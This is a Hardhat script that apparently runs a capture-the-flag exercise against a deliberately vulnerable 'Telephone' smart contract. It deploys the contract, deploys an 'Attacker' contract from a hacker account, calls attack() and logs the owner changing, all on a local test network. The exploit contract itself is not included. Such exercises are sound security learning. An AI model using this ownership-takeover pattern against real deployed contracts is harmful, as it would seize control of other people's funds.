const hre = require("hardhat");
const {waffle} = require("hardhat");

import { Signer } from "ethers";
const ethers = hre.ethers;
const provider = waffle.provider;

async function main(){
    let user: Signer, hacker: Signer;

    [user, hacker] = await ethers.getSigners();

    const Telephone = await ethers.getContractFactory("Telephone", user);
    const telephone = await Telephone.deploy();
    await telephone.deployed();

    console.log('User address', await user.getAddress());
    console.log('Hacker address', await hacker.getAddress());

    console.log('Initial state, owner is', await telephone.owner());
    
    const Attacker = await ethers.getContractFactory("Attacker", hacker);
    const attacker = await Attacker.deploy(telephone.address);
    await attacker.deployed();

    await attacker.attack();

    console.log("Final state, owner is", await telephone.owner());

}

main().then(()=>process.exit(0))
    .catch((err)=>{
        console.log(err);
        process.exit(1);
    })
    